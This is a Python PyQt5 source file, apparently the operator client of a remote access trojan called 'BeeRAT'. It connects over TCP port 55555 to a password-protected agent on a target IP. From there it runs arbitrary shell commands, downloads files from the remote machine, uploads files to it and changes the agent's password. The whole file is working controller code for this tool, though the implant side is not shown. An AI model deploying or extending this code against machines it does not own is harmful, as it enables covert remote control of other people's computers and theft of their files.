import base64
import json
import os
import socket
from PyQt5 import QtTest
from PyQt5 import QtWidgets as qtw
from PyQt5.QtCore import QThread, pyqtSignal
from PyQt5.uic import loadUi

FORMAT = 'utf-8'


class Client(qtw.QWidget):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.script_location = os.path.dirname(__file__)
        self.ui_file = 'client.ui'
        self.ui = loadUi(os.path.join(self.script_location, self.ui_file), self)
        self.ui.pb.clicked.connect(self.connect)
        self.ui.le.returnPressed.connect(self.enter)

    def closeEvent(self, event) -> None:
        os._exit(0)

    def connection(self, client_socket):
        self.client_socket = client_socket

    def disable_ui_elements(self, elements):
        self.ui.le1.setEnabled(not elements[0])
        self.ui.le2.setEnabled(not elements[1])
        self.ui.pb.setEnabled(not elements[2])
        self.ui.le.setEnabled(not elements[3])

    def connect(self):
        self.connect_thread = ConnectThread(ip=self.ui.le1.text(), password=self.ui.le2.text())
        self.connect_thread.start()
        self.connect_thread.log_signal.connect(lambda text: self.ui.tb.append(text))
        self.connect_thread.elements_signal.connect(self.disable_ui_elements)
        self.connect_thread.socket_signal.connect(self.connection)
        self.connect_thread.placeholder_signal.connect(lambda text: self.ui.le.setPlaceholderText(text))

    def enter(self):
        command = self.ui.le.text()
        if command == 'upload':
            file_dialog = qtw.QFileDialog.getOpenFileName(self, 'Select a file', '', 'All files (*.*)')
            file_path = file_dialog[0]
            if file_path:
                self.ui.le.setText(f'upload {file_path}')
            else:
                self.ui.le.setText("")
        else:
            self.ui.le.clear()
            self.enter_thread = EnterThread(client=self.client_socket, command=command)
            self.enter_thread.start()
            self.enter_thread.log_signal.connect(lambda text: self.ui.tb.append(text))
            self.enter_thread.elements_signal.connect(self.disable_ui_elements)
            self.enter_thread.placeholder_signal.connect(lambda text: self.ui.le.setPlaceholderText(text))
            self.enter_thread.clear_signal.connect(lambda: self.ui.tb.clear())
            self.enter_thread.focus_signal.connect(lambda: self.ui.le.setFocus())


class ConnectThread(QThread):
    log_signal = pyqtSignal(str)
    elements_signal = pyqtSignal(list)
    socket_signal = pyqtSignal(socket.socket)
    placeholder_signal = pyqtSignal(str)

    def __init__(self, ip, password, parent=None) -> None:
        super(ConnectThread, self).__init__(parent)
        self.script_location = os.path.dirname(__file__)
        self.ip = ip
        self.password = password

    def run(self) -> None:
        try:
            self.log_signal.emit(f'BeeRAT-Client$ connect {self.ip}')
            self.elements_signal.emit([True, True, True, True])
            QtTest.QTest.qWait(100)
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.settimeout(3)
            self.client.connect((self.ip, 55555))
            self.client.settimeout(None)
            self.send(self.password)
            result = self.recv()
            if result:
                self.log_signal.emit('[+] Connected.')
                self.placeholder_signal.emit(self.get_prompt())
                self.elements_signal.emit([True, True, True, False])
                self.socket_signal.emit(self.client)
            else:
                self.log_signal.emit('[-] Password is incorrect.')
                self.send(None)
                self.elements_signal.emit([False, False, False, True])
        except (ConnectionRefusedError, TimeoutError):
            self.log_signal.emit('[-] Connection failed.')
            self.elements_signal.emit([False, False, False, True])
        except Exception:
            self.log_signal.emit('[-] Invalid ip.')
            self.elements_signal.emit([False, False, False, True])

    def send(self, data):
        json_data = json.dumps(data)
        self.client.send(json_data.encode(FORMAT))

    def recv(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.client.recv(1024).decode(FORMAT)
                return json.loads(json_data)
            except ValueError:
                continue

    def get_prompt(self):
        self.send('prompt')
        prompt = self.recv()
        return f'{prompt}$ '


class EnterThread(QThread):
    log_signal = pyqtSignal(str)
    elements_signal = pyqtSignal(list)
    placeholder_signal = pyqtSignal(str)
    clear_signal = pyqtSignal()
    focus_signal = pyqtSignal()

    def __init__(self, client, command, parent=None) -> None:
        super(EnterThread, self).__init__(parent)
        self.script_location = os.path.dirname(__file__)
        self.client = client
        self.command = command

    def run(self) -> None:
        enable_le = True
        try:
            self.log_signal.emit(f'{self.get_prompt()}{self.command}')
            self.elements_signal.emit([True, True, True, True])
            command = self.command.split(' ')
            QtTest.QTest.qWait(100)
            if command[0] == 'exit':  # 6
                self.send('exit')
                self.log_signal.emit('[-] Disconnected.')
                self.placeholder_signal.emit('')
                self.elements_signal.emit([False, False, False, True])
                enable_le = False
            elif command[0] == 'clear':  # 5
                self.clear_signal.emit()
            elif command[0] == 'download':  # 4
                file_path = ' '.join(command[1:])
                self.send(f'downloadable {file_path}')
                downloadable = self.recv()
                if downloadable:
                    file_name = os.path.basename(file_path)
                    self.send(' '.join(command))
                    file_content = self.recv()
                    self.log_signal.emit(self.write_file(file_name, file_content))
                else:
                    self.log_signal.emit(f'download: {file_path}: Not downloadable')
            elif command[0] == 'upload':  # 3
                file_path = ' '.join(command[1:])
                if self.uploadable(file_path):
                    file_name = os.path.basename(file_path)
                    file_content = self.read_file(file_path)
                    self.send(f'upload {file_name}')
                    self.send(file_content)
                    self.log_signal.emit(self.recv())
                else:
                    self.log_signal.emit(f'upload: {file_path}: Not uploadable')
            elif command[0] == 'change-password':  # 2
                password = ' '.join(command[1:])
                if len(password) >= 8:
                    self.send(' '.join(command))
                    if self.recv():
                        self.log_signal.emit('[+] Password saved successfully.')
                else:
                    self.log_signal.emit('[-] password must be at least 8 characters long.')
            else:  # 1
                command = ' '.join(command)
                self.send(command)
                result = self.recv()
                self.log_signal.emit(str(result))
                self.placeholder_signal.emit(self.get_prompt())
        except ConnectionResetError:
            self.log_signal.emit('[-] Server disconnected.')
            self.placeholder_signal.emit('')
            self.elements_signal.emit([False, False, False, True])
            enable_le = False
        except Exception as e:
            self.log_signal.emit(str(e))
        finally:
            if enable_le:
                self.elements_signal.emit([True, True, True, False])
                self.focus_signal.emit()

    def send(self, data):
        json_data = json.dumps(data)
        self.client.send(json_data.encode(FORMAT))

    def recv(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.client.recv(1024).decode(FORMAT)
                return json.loads(json_data)
            except ValueError:
                continue

    def get_prompt(self):
        self.send('prompt')
        prompt = self.recv()
        return f'{prompt}$ '

    @staticmethod
    def rename_file(file_name):
        filename, extension = os.path.splitext(file_name)
        counter = 1
        while os.path.exists(file_name):
            file_name = f'{filename} ({counter}){extension}'
            counter += 1
        return file_name

    @staticmethod
    def read_file(path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read()).decode(FORMAT)

    def write_file(self, filename, content):
        content = content.encode(FORMAT)
        filename = self.rename_file(filename)
        with open(filename, 'wb') as file:
            file.write(base64.b64decode(content))
            return f'[+] {filename} downloaded successfully.'

    def uploadable(self, file_path):
        if os.path.isfile(file_path):
            return True
        if os.path.isfile(os.path.join(self.script_location, file_path)):
            return True
        return False


def main():
    app = qtw.QApplication([])
    widget = Client()
    widget.show()
    app.exec_()


if __name__ == '__main__':
    main()
